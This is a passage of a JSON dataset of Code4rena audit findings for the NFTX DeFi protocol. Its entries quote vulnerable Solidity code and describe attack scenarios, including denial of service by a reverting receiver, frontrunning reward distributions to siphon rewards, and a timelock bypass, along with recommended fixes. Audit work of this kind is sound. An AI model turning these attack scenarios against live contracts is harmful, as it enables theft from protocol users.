      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/40",
      "tags": [],
      "finders": [
        "csanuragjain",
        "sirhashalot",
        "cmichel",
        "robee",
        "leastwood",
        "WatchPug",
        "0x1f8b",
        "hyh",
        "defsec"
      ]
    },
    {
      "id": "1232",
      "title": "[M-16] Malicious receiver can make distribute function denial of service",
      "impact": "MEDIUM",
      "content": "_Submitted by cccz_\n\nIn the NFTXSimpleFeeDistributor.sol contract, the distribute function calls the \\_sendForReceiver function to distribute the fee\n\n```solidity\nfunction distribute(uint256 vaultId) external override virtual nonReentrant {\n  require(nftxVaultFactory != address(0));\n  address _vault = INFTXVaultFactory(nftxVaultFactory).vault(vaultId);\n\n  uint256 tokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this));\n\n  if (distributionPaused || allocTotal == 0) {\n    IERC20Upgradeable(_vault).safeTransfer(treasury, tokenBalance);\n    return;\n  }\n\n  uint256 length = feeReceivers.length;\n  uint256 leftover;\n  for (uint256 i = 0; i <length; i++) {\n    FeeReceiver memory _feeReceiver = feeReceivers[i];\n    uint256 amountToSend = leftover + ((tokenBalance * _feeReceiver.allocPoint) / allocTotal);\n    uint256 currentTokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this));\n    amountToSend = amountToSend> currentTokenBalance? currentTokenBalance: amountToSend;\n    bool complete = _sendForReceiver(_feeReceiver, vaultId, _vault, amountToSend);\n    if (!complete) {\n      leftover = amountToSend;\n    } else {\n      leftover = 0;\n    }\n  }\n```\n\nIn the \\_sendForReceiver function, when the \\_receiver is a contract, the receiver's receiveRewards function will be called. If the receiver is malicious, it can execute revert() in the receiveRewards function, resulting in DOS.\n\n```solidity\nfunction _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {\n  if (_receiver.isContract) {\n    IERC20Upgradeable(_vault).approve(_receiver.receiver, amountToSend);\n    // If the receive is not properly processed, send it to the treasury instead.\n      \n    bytes memory payload = abi.encodeWithSelector(INFTXLPStaking.receiveRewards.selector, _vaultId, amountToSend);\n    (bool success,) = address(_receiver.receiver).call(payload);\n\n    // If the allowance has not been spent, it means we can pass it forward to next.\n    return success && IERC20Upgradeable(_vault).allowance(address(this), _receiver.receiver) == 0;\n  } else {\n    IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);\n  }\n}\n```\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L157-L166>\n\n#### Recommended Mitigation Steps\n\nThe contract can store the fee sent to the receiver in a state variable, and then the receiver can take it out by calling a function.\n\n**[0xKiwi (NFTX) confirmed, but disagreed with high severity and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/69#issuecomment-1003192680):**\n > This is a permissioned entity, but this is a valid concern. User funds not at risk and the dao can remove the malciious receiver (if it ever gets there in the first place). Good thinking. \n\n**[0xKiwi (NFTX) resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/69)**\n\n**[LSDan (judge) decreased severity to medium and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/69#issuecomment-1064475286):**\n > This is a medium risk, not high. The attack has external requirements and is relatively easy for the DAO to mitigate.\n\n\n\n***\n\n",
      "summary": "\nThe NFTXSimpleFeeDistributor.sol contract contains a vulnerability that could lead to a denial of service (DOS) attack. In the distribute function, the contract calls the _sendForReceiver function to distribute the fee. In the _sendForReceiver function, if the receiver is a contract, the receiver's receiveRewards function will be called. If the receiver is malicious, it can execute revert() in the receiveRewards function, resulting in a DOS attack. To mitigate this vulnerability, the contract can store the fee sent to the receiver in a state variable, and then the receiver can take it out by calling a function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/69",
      "tags": [],
      "finders": [
        "cccz"
      ]
    },
    {
      "id": "1231",
      "title": "[M-15] No access control on assignFees() function in NFTXVaultFactoryUpgradeable contract",
      "impact": "MEDIUM",
      "content": "_Submitted by ych18_\n\nIf the Vault owner decides to set factoryMintFee and factoryRandomRedeemFee to zero, any user could call the function NFTXVaultFactoryUpgradeable.assignFees() and hence all the fees are updated.\n\n**[0xKiwi (NFTX) confirmed and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/50#issuecomment-1003233969):**\n > This function is left over from some upgrades. It will be removed. Thank you.\n\n**[0xKiwi (NFTX) resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/50)**\n\n\n\n***\n\n",
      "summary": "\nA bug report has been submitted by user ych18. The report states that if the Vault owner sets the factoryMintFee and factoryRandomRedeemFee to zero, any user can call the function NFTXVaultFactoryUpgradeable.assignFees() and the fees will be updated. This means that if a user is able to call this function, they will be able to change the fees for minting and redeeming without permission from the Vault owner. This could lead to unauthorized changes in fees and could cause problems for the Vault owner.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/50",
      "tags": [],
      "finders": [
        "ych18"
      ]
    },
    {
      "id": "1230",
      "title": "[M-14] Return variable can remain unassigned in _sendForReceiver",
      "impact": "MEDIUM",
      "content": "_Submitted by sirhashalot, also found by pauliax_\n\nThe `_sendForReceiver()` function only sets a return function in the \"if\" code block, not the \"else\" case. If the \"else\" case is true, no value is returned. The result of this oversight is that the `_sendForReceiver()` function called from the `distribute()` function could sucessfully enter its `else` block if a receiver has `isContract` set to False and successfully transfer the `amountToSend` value. The `ditribute()` function will then have `leftover > 0` and send `currentTokenBalance` to the treasury. This issue is partially due to [Solidity using implicit returns](https://github.com/ethereum/solidity/issues/2951), so if no bool value is explicitly returned, the default bool value of False will be returned.\n\nThis problem currently occurs for any receiver with `isContract` set to False. The `_addReceiver` function allows for `isContract` to be set to False, so such a condition should not result in tokens being sent to the treasury as though it was an emergency scenario.\n\n#### Proof of Concept\n\nThe `else` block is missing a return value\n<https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L167-L169>\n\n#### Tools Used\n\nVS Code \"Solidity Visual Developer\" extension\n\n#### Recommended Mitigation Steps\n\nVerify that functions with a return value do actually return a value in all cases. Adding the line `return true;` can be added to the end of the `else` block as one way to resolve this.\n\nAlternatively, if `isContract` should never be set to False, the code should be designed to prevent a receiver from being added with this value.\n\n**[0xKiwi (NFTX) confirmed and resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/121#issuecomment-1003228547)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the `_sendForReceiver()` function in the `distribute()` function of the NFTXSimpleFeeDistributor.sol file. The issue is that the `_sendForReceiver()` function only sets a return function in the \"if\" code block, not the \"else\" case. This means that if the \"else\" case is true, no value is returned and the `distribute()` function could sucessfully enter its `else` block if a receiver has `isContract` set to False and successfully transfer the `amountToSend` value. As a result, the `ditribute()` function will then have `leftover > 0` and send `currentTokenBalance` to the treasury. The issue is partially due to Solidity using implicit returns, so if no bool value is explicitly returned, the default bool value of False will be returned.\n\nThe recommended mitigation steps are to verify that functions with a return value do actually return a value in all cases. Adding the line `return true;` can be added to the end of the `else` block as one way to resolve this. Alternatively, if `isContract` should never be set to False, the code should be designed to prevent a receiver from being added with this value. The bug was identified with the VS Code \"Solidity Visual Developer\" extension.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/121",
      "tags": [],
      "finders": [
        "sirhashalot",
        "pauliax"
      ]
    },
    {
      "id": "1229",
      "title": "[M-13] Dishonest Stakers Can Siphon Rewards From xToken Holders Through The deposit Function In NFTXInventoryStaking",
      "impact": "MEDIUM",
      "content": "## Handle\n\nleastwood\n\n\n## Vulnerability details\n\n## Impact\n\n`xTokens` is intended to be a representation of staked vault tokens. As the protocol's vaults accrue fees from users, these fees are intended to be distributed to users in an inconsistent fashion. `NFTXInventoryStaking` is one of the ways users can stake vault tokens. Deposits are timelocked for `2` seconds by default, essentially rendering flash loan attacks redundant. However, it is more than likely that the same user could withdraw their `xToken` deposit in the next block (assuming an average block time of just over 13 seconds).\n\nHence, if a well-funded attacker sees a transaction to distribute rewards to `xToken` holders, they could deposit a large sum of vault tokens and receive a majority share of the rewards before withdrawing their tokens in the following block. Additionally, the attacker can force distribute rewards in `NFTXSimpleFeeDistributor` as there is no access control on the `distribute` function.\n\nThis issue allows users to siphon user's rewards from the protocol, intended to be distributed to honest vault token stakers.\n\n## Proof of Concept\n\nConsider the following exploit scenario:\n\n- Currently there are 1000 `shares` and 1000 `base tokens` in the `XTokenUpgradeable` contract.\n- Honest actor, Alice, calls `distribute` in `NFTXSimpleFeeDistributor` which attempts to send 200 `base tokens` as rewards for `xToken` holders accrued via protocol usage.\n- Bob sees a transaction to reward `xToken` holders and frontruns this transaction by staking vault tokens, minting 1000 `shares` and 1000 `base tokens`.\n- Rewards are distributed such that `XTokenUpgradeable` has 2000 `shares` and 2200 `base tokens`.\n- Bob unstakes his tokens and exits the pool, redeeming his 1000 `shares` for 1100 `base tokens`.\n- As a result, Bob was able to siphon off 100 `base tokens` without having to stake their tokens for the same time period that Alice had staked her tokens for.\n- This unfair distribution can be abused again and again to essentially reward dishonest actors over honest staking participants such as Alice.\n\n## Tools Used\n\nManual code review.\nDiscussions with Kiwi.\n\n## Recommended Mitigation Steps\n\nConsider adding a delay to users token deposits into the `XTokenUpgradeable` such that miners cannot feasibly censor a transaction for the specified time interval and users cannot frontrun a transaction to distribute rewards. The interval should be chosen such that enough time is provided for the transaction to be included in a block, given poor network conditions. \n\nI.e. If the chosen interval is 20 blocks. Miners must be able to censor the rewards distribution for 20 blocks. This is unlikely as there would need to be sufficient miner collusion for value to be extracted from the protocol. Additionally, an interval of 20 blocks means that stakers who attempt to enter the pool upon seeing the transaction in the mempool won't be rewarded for such behaviour.\n\nIt is also essential that the `distribute` function in `NFTXSimpleFeeDistributor` is restricted to a given role, ensuring malicious users cannot control at what point rewards are distributed.\n\nAlternatively, PoolTogether has a Time-Weighted-Average-Balance (TWAB) implementation which can be used as [reference](https://v4.docs.pooltogether.com/protocol/concepts/time-weight-average-balance/). This would ensure the fairest distribution of rewards to stakers, however, there are additional gas costs associated with this implementation. Hence, unless the protocol intends to be used primarily on L2 protocols, this solution should be avoided.",
      "summary": "\nThis bug report is about a vulnerability in the `xTokens` protocol which allows users to siphon rewards from the protocol intended to be distributed to honest vault token stakers. This is possible due to the lack of access control on the `distribute` function in `NFTXSimpleFeeDistributor` and the ability to deposit tokens into the `XTokenUpgradeable` contract with no delay. A proof of concept was provided to demonstrate how an attacker could frontrun a transaction and receive a majority of the rewards before withdrawing their tokens in the next block. \n\nTo mitigate this issue, a delay should be added to users token deposits such that miners are unable to censor a transaction for a specified amount of time and users cannot frontrun a transaction. Additionally, the `distribute` function in `NFTXSimpleFeeDistributor` should be restricted to a given role to prevent malicious users from controlling when rewards are distributed. As an alternative, PoolTogether has a Time-Weighted-Average-Balance (TWAB) implementation which can be used as reference, however, there are additional gas costs associated with this implementation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/57",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1228",
      "title": "[M-12] buyAndSwap1155WETH Does Not Work As Intended",
      "impact": "MEDIUM",
      "content": "## Handle\n\nleastwood\n\n\n## Vulnerability details\n\n## Impact\n\nThe `buyAndSwap1155WETH` function in `NFTXMarketplaceZap` aims to facilitate buying and swapping `ERC1155` tokens within a single transaction. The function expects to transfer `WETH` tokens from the `msg.sender` account and use these tokens in purchasing vault tokens. However, the `_buyVaultToken` call in `buyAndSwap1155WETH` actually uses `msg.value` and not `maxWethIn`. As a result, the function will not work unless the user supplies both `WETH` and native `ETH` amounts, equivalent to the `maxWethIn` amount.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L284-L314\n```\nfunction buyAndSwap1155WETH(\n  uint256 vaultId, \n  uint256[] memory idsIn, \n  uint256[] memory amounts, \n  uint256[] memory specificIds, \n  uint256 maxWethIn, \n  address[] calldata path,\n  address to\n) public payable nonReentrant {\n  require(to != address(0));\n  require(idsIn.length != 0);\n  IERC20Upgradeable(address(WETH)).transferFrom(msg.sender, address(this), maxWethIn);\n  uint256 count;\n  for (uint256 i = 0; i < idsIn.length; i++) {\n      uint256 amount = amounts[i];\n      require(amount > 0, \"Transferring < 1\");\n      count += amount;\n  }\n  INFTXVault vault = INFTXVault(nftxFactory.vault(vaultId));\n  uint256 redeemFees = (vault.targetSwapFee() * specificIds.length) + (\n      vault.randomSwapFee() * (count - specificIds.length)\n  );\n  uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, msg.value, path);\n  _swap1155(vaultId, idsIn, amounts, specificIds, to);\n\n  emit Swap(count, swapAmounts[0], to);\n\n  // Return extras.\n  uint256 remaining = WETH.balanceOf(address(this));\n  WETH.transfer(to, remaining);\n}\n```\n\n## Tools Used\n\nManual code review.\nDiscussions with Kiwi.\n\n## Recommended Mitigation Steps\n\nConsider updating the `buyAndSwap1155WETH` function such that the following line of code is used instead of [this](https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L306).\n\n```\nuint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, maxWethIn, path);\n```",
      "summary": "\nA vulnerability was identified in the `buyAndSwap1155WETH` function in `NFTXMarketplaceZap`, a smart contract used to facilitate buying and swapping `ERC1155` tokens. The function expects to transfer `WETH` tokens from the `msg.sender` account and use these tokens in purchasing vault tokens, but instead uses `msg.value` and not `maxWethIn`. This means the function will not work unless the user supplies both `WETH` and native `ETH` amounts, equivalent to the `maxWethIn` amount.\n\nThe vulnerability was identified through manual code review and discussions with Kiwi. To mitigate this issue, consider updating the `buyAndSwap1155WETH` function such that the `_buyVaultToken` call uses `maxWethIn` instead of `msg.value`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/45",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1227",
      "title": "[M-11] NFTXVaultFactoryUpgradeable implementation can be replaced in production breaking the system",
      "impact": "MEDIUM",
      "content": "_Submitted by hyh_\n\n`NFTXVaultFactory` contract holds information regarding vaults, assets and permissions (vaults, \\_vaultsForAsset and excludedFromFees mappings).\nAs there is no mechanics present that transfers this information to another implementation, the switch of nftxVaultFactory to another address performed while in production will break the system.\n\n#### Proof of Concept\n\n`setNFTXVaultFactory` function allows an owner to reset `nftxVaultFactory` without restrictions in the following contracts:\n\nNFTXLPStaking\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXLPStaking.sol#L59>\n\nNFTXInventoryStaking\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXInventoryStaking.sol#L51>\n\nNFTXSimpleFeeDistributor\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L135>\n\n#### Recommended Mitigation Steps\n\nEither restrict the ability to change the factory implementation to pre-production stages or make `nftxVaultFactory` immutable by allowing changing it only once:\n\nNow:\n```solidity\nfunction setNFTXVaultFactory(address newFactory) external virtual override onlyOwner {\n  require(newFactory != address(0));\n  nftxVaultFactory = INFTXVaultFactory(newFactory);\n}\n```\n\nTo be:\n```solidity\nfunction setNFTXVaultFactory(address newFactory) external virtual override onlyOwner {\n  require(nftxVaultFactory == address(0), \"nftxVaultFactory is immutable\");\n  nftxVaultFactory = INFTXVaultFactory(newFactory);\n}\n```\n\nIf the implementation upgrades in production is desired, the factory data migration logic should be implemented and then used atomically together with the implementation switch in all affected contracts.\n\n**[0xKiwi (NFTX) confirmed and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/177#issuecomment-1003213811):**\n > This is not a contract that is designed to be replaced, but upgraded. But it is a valid concern that these assistant contracts can have their factory be changed and rendered broken. (even if it were permissioned)<br>\n> Confirming.\n\n**[0xKiwi (NFTX) resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/177)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the `NFTXVaultFactory` contract which holds information regarding vaults, assets and permissions. The report states that if the switch of nftxVaultFactory to another address is performed while in production, it will break the system. The report also provides the proof of concept by showing the `setNFTXVaultFactory` function which allows an owner to reset `nftxVaultFactory` without restrictions in the following contracts. There are two recommended mitigation steps to prevent this bug from occurring. The first is to restrict the ability to change the factory implementation to pre-production stages. The second is to make `nftxVaultFactory` immutable by allowing changing it only once. If the implementation upgrades in production is desired, the factory data migration logic should be implemented and then used atomically together with the implementation switch in all affected contracts.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/177",
      "tags": [],
      "finders": [
        "hyh"
      ]
    },
    {
      "id": "1226",
      "title": "[M-10] NFTXSimpleFeeDistributor._sendForReceiver doesn’t return success if receiver is not a contract",
      "impact": "MEDIUM",
      "content": "## Handle\n\nhyh\n\n\n## Vulnerability details\n\n## Impact\n\nDouble spending of fees being distributed will happen in favor of the first fee receivers in the `feeReceivers` list at the expense of the last ones.\nAs `_sendForReceiver` doesn't return success for completed transfer when receiver isn't a contract, the corresponding fee amount is sent out twice, to the current and to the next fee receiver in the list. This will lead to double payments for those receivers who happen to be next in the line right after EOAs, and missed payments for the receivers positioned closer to the end of the list as the funds available are going to be already depleted when their turn comes.\n\n## Proof of Concept\n\n`distribute` use `_sendForReceiver` to transfer current vault balance across `feeReceivers`:\nhttps://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L67\n\n`_sendForReceiver` returns a boolean that is used to move current distribution amount to the next receiver when last transfer failed.\nWhen `_receiver.isContract` is `false` nothing is returned, while `safeTransfer` is done:\nhttps://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L168\n\nThis way `_sendForReceiver` will indicate that transfer is failed and leftover amount to be added to the next transfer, i.e. the `amountToSend` will be spent twice:\nhttps://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L64\n\n## Recommended Mitigation Steps\n\nNow:\n```\nfunction _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {\n\tif (_receiver.isContract) {\n\t...\n\t} else {\n\t\tIERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);\n\t}\n}\n```\n\nTo be:\n```\nfunction _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {\n\tif (_receiver.isContract) {\n\t...\n\t} else {\n\t\tIERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);\n\t\treturn true;\n\t}\n}\n```",
      "summary": "\nA bug has been reported in the NFTXSimpleFeeDistributor.sol contract code. The bug can cause double spending of fees that are distributed, in favor of the first fee receivers in the feeReceivers list at the expense of the last ones. This happens because the _sendForReceiver function does not return success for completed transfer when the receiver is not a contract. As a result, the corresponding fee amount is sent out twice, to the current and to the next fee receiver in the list. This will lead to double payments for those receivers who happen to be next in the line right after EOAs, and missed payments for the receivers positioned closer to the end of the list as the funds available are going to be already depleted when their turn comes.\n\nThe recommended mitigation step is to update the _sendForReceiver function to return true when the receiver is not a contract, as this will indicate that the transfer is complete.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/105",
      "tags": [],
      "finders": [
        "hyh"
      ]
    },
    {
      "id": "1225",
      "title": "[M-09] Bypass zap timelock",
      "impact": "MEDIUM",
      "content": "_Submitted by gzeon_\n\nThe default value of `inventoryLockTime` in `NFTXStakingZap` is `7 days` while `DEFAULT_LOCKTIME` in `NFTXInventoryStaking` is 2 ms. These timelock value are used in `NFTXInventoryStaking` to eventually call `_timelockMint` in `XTokenUpgradeable`.\n\n<https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/token/XTokenUpgradeable.sol#L74>\n\n```solidity\nfunction _timelockMint(address account, uint256 amount, uint256 timelockLength) internal virtual {\n  uint256 timelockFinish = block.timestamp + timelockLength;\n  timelock[account] = timelockFinish;\n  emit Timelocked(account, timelockFinish);\n  _mint(account, amount);\n}\n```\n\nThe applicable timelock is calculated by `block.timestamp + timelockLength`, even when the existing timelock is further in the future. Therefore, one can reduce their long (e.g. 7 days) timelock to 2 ms calling `deposit` in `NFTXInventoryStaking`\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L160>\n<https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXInventoryStaking.sol#L30>\n\n#### Recommended Mitigation Steps\n\n```solidity\nfunction _timelockMint(address account, uint256 amount, uint256 timelockLength) internal virtual {\n  uint256 timelockFinish = block.timestamp + timelockLength;\n  if(timelockFinish > timelock[account]){\n    timelock[account] = timelockFinish;\n    emit Timelocked(account, timelockFinish);\n  }\n  _mint(account, amount);\n}\n```\n\n**[0xKiwi (NFTX) disputed](https://github.com/code-423n4/2021-12-nftx-findings/issues/178)**\n\n**[0xKiwi (NFTX) confirmed and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/178#issuecomment-1007082108):**\n > After taking another look, this is definitely accurate. Thank you!\n\n**[0xKiwi (NFTX) resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/178)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the NFTX protocol, which is used to upgrade tokens. The vulnerability is that the default value of `inventoryLockTime` in `NFTXStakingZap` is `7 days` while `DEFAULT_LOCKTIME` in `NFTXInventoryStaking` is 2 ms. This means that one can reduce their long (e.g. 7 days) timelock to 2 ms by calling `deposit` in `NFTXInventoryStaking`. The applicable timelock is calculated by `block.timestamp + timelockLength`, even when the existing timelock is further in the future. \n\nThe recommended mitigation step is to modify the `_timelockMint` function, so that the timelock is only updated if the new timelock is further in the future. This can be done with the following code: \n```\n    function _timelockMint(address account, uint256 amount, uint256 timelockLength) internal virtual {\n        uint256 timelockFinish = block.timestamp + timelockLength;\n        if(timelockFinish > timelock[account]){\n            timelock[account] = timelockFinish;\n            emit Timelocked(account, timelockFinish);\n        }\n        _mint(account, amount);\n    }\n```\nThis bug report was submitted by gzeon.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/178",
      "tags": [],
      "finders": [
        "gzeon"
      ]
    },
    {
      "id": "1224",
      "title": "[M-08] Low-level call return value not checked",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel_\n\nThe `NFTXStakingZap.addLiquidity721ETHTo` function performs a low-level `.call` in `payable(to).call{value: msg.value-amountEth}` but does not check the return value if the call succeeded.\n\n#### Impact\n\nIf the call fails, the refunds did not succeed and the caller will lose all refunds of `msg.value - amountEth`.\n\n#### Recommended Mitigation Steps\n\nRevert the entire transaction if the refund call fails by checking that the `success` return value of the `payable(to).call(...)` returns `true`.\n\n**[0xKiwi (NFTX) confirmed and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/140#issuecomment-1003224022):**\n > Nice catch, thank you. Confirmed.\n\n**[0xKiwi (NFTX) resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/140)**\n\n\n\n***\n\n",
      "summary": "\nA bug has been found in the `NFTXStakingZap.addLiquidity721ETHTo` function, which performs a low-level `.call` in `payable(to).call{value: msg.value-amountEth}` but does not check the return value if the call succeeds. This means that if the call fails, the refunds will not succeed and the caller will lose all refunds of `msg.value - amountEth`. To mitigate this issue, it is recommended to revert the entire transaction if the refund call fails by checking that the `success` return value of the `payable(to).call(...)` returns `true`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/140",
      "tags": [],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1223",
      "title": "[M-07] Rewards can be stolen",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel_\n\nThe `NFTXInventoryStaking` contract distributes new rewards to all previous stakers when the owner calls the `receiveRewards` function.\nThis allows an attacker to frontrun this `receiveRewards` transaction when they see it in the mem pool with a `deposit` function.\nThe attacker will receive the rewards pro-rata to their deposits.\nThe deposit will be locked for 2 seconds only (`DEFAULT_LOCKTIME`) after which the depositor can withdraw their initial deposit & the rewards again for a profit.\n\nThe rewards can be gamed this way and one does not actually have to *stake*, only be in the staking contract at the time of reward distribution for 2 seconds.\nThe rest of the time they can be used for other purposes.\n\n#### Recommended Mitigation Steps\n\nDistribute the rewards equally over time to the stakers instead of in a single chunk on each `receiveRewards` call.\nThis is more of a \"streaming rewards\" approach.\n\n**[0xKiwi (NFTX) confirmed and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/136#issuecomment-1003225759):**\n > Thanks for the report. \n> \n> This is unfortunately unavoidable but streaming isn't a bad idea. Will consider. Thank you.\n> \n> Confirming.\n\n\n\n***\n\n",
      "summary": "\nThis bug report describes a vulnerability in the `NFTXInventoryStaking` contract, which allows an attacker to frontrun the `receiveRewards` transaction when it is in the mem pool. The attacker can then deposit into the contract and receive the rewards pro-rata to their deposits, before withdrawing their initial deposit and the rewards for a profit. The bug report recommends mitigating this vulnerability by distributing rewards equally over time to the stakers, instead of in a single chunk on each `receiveRewards` call.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/136",
      "tags": [],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1222",
      "title": "[M-06] xToken Approvals Allow Spenders To Spend More Tokens",
      "impact": "MEDIUM",
      "content": "## Handle\n\nleastwood\n\n\n## Vulnerability details\n\n## Impact\n\nThe `approve` function has not been overridden and therefore uses `xToken` shares instead of the equivalent rebalanced amount, i.e. the underlying vault token amount.\n\n## Proof of Concept\n\nThe approved spender may spend more tokens than desired. In fact, the approved amount that can be transferred keeps growing as rewards continue to be distributed to the `XTokenUpgradeable` contract.\n\nMany contracts also use the same amount for the `approve` call as for the amount they want to have transferred in a subsequent `transferFrom` call, and in this case, they approve an amount that is too large (as the approved `shares` amount yields a higher rebalanced amount).\n\n## Tools Used\n\nManual code review.\n\n## Recommended Mitigation Steps\n\nThe `_allowances` field should track the rebalanced amounts (i.e. the equivalent vault token amount) such that the approval value does not grow.\n\nThe `transferFrom` needs to be overridden and approvals should then be subtracted by the transferred vault token `amount`, not `shares`.",
      "summary": "\nThis bug report is about a vulnerability in the `approve` function of a contract, which has not been overridden. This vulnerability allows the approved spender to spend more tokens than desired, as the approved amount keeps growing as rewards are distributed to the `XTokenUpgradeable` contract. A manual code review was conducted to identify the vulnerability, and a solution is proposed, which is to track the rebalanced amounts (i.e. the equivalent vault token amount) in the `_allowances` field, and override the `transferFrom` function to subtract the transferred vault token `amount` instead of `shares`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/58",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1221",
      "title": "[M-05] Pool Manager can frontrun fees to 100% and use it to steal the value from users",
      "impact": "MEDIUM",
